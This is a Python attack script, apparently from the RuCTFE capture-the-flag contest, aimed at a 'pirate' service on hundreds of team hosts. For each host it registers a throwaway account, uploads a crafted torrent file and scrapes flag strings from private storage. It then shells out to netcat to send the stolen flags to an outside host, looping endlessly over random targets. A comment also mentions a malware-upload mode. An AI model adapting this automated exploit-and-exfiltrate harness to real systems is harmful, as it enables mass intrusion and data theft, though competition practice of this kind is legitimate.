#!/usr/bin/env python

import exploiter
import requests
import uuid
import re
import os
import random
#my_id e teams_count presi da https://ructfe.org/teams/, ricontrolla prima di avviare
my_id = 93
teams_count = 358

SERVICE = "pirate"

INCLUDE = []
for n in xrange(1, teams_count + 1):
    INCLUDE.append("team%s.ructfe.org" % (n))

EXCLUDE = ["10.%s.%s.2" % (60 + my_id / 256, my_id % 256)] #attacarci da soli non  bello ;)

#opzionale, default 1
WORKERS = 4

#opzionale, default 10
TIMEOUT = 5

#opzionale, default False
NOFLAGS = False #True solo quando vuoi caricare un malware e non leggere flags
rr = re.compile("\w{31}=")
# f = open("test.torrent", "rb")
# hh=f.read()
# f.close()
def exploit(ip):
    try:
        URL = "http://" + ip + ":8081"
        s = requests.session()
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

        r = s.post(URL + "/signup", data={'login':uuid.uuid4(),'password':uuid.uuid4()}, headers=headers, timeout=30)
        # print r.text
        data = {'Upload': ''}
        r = s.post((URL + "/upload_private").rstrip(), files={"upload_file": open("test.torrent")}, headers=headers, timeout=30)
        # print r
        # print r.text
        # print requests.utils.dict_from_cookiejar(s.cookies)
        # print r.request.headers
        # print repr(URL + "/upload_private")
        r = s.get(URL + "/private_storage", headers=headers, timeout=30)
        # print r
        # print r.text
        t = rr.findall(r.text)
        t = list(set(t))
        if len(t) > 0:
            # print URL
            # print t
            pp = open("jjj","a")
            pp.write(ip+"\n")
            pp.close()
            for k in t:
                p = os.system("echo \"%s\n\n\"  | nc flags.ructfe.org 31337" % k)
                print p
        print "\n".join(t)
        return "".join(t)
    except Exception as e:
        print e
        pass
while True:
    n = random.randint(1, 300)
    if "93" not in INCLUDE[n]:
        exploit(INCLUDE[n])
# exploiter.run()

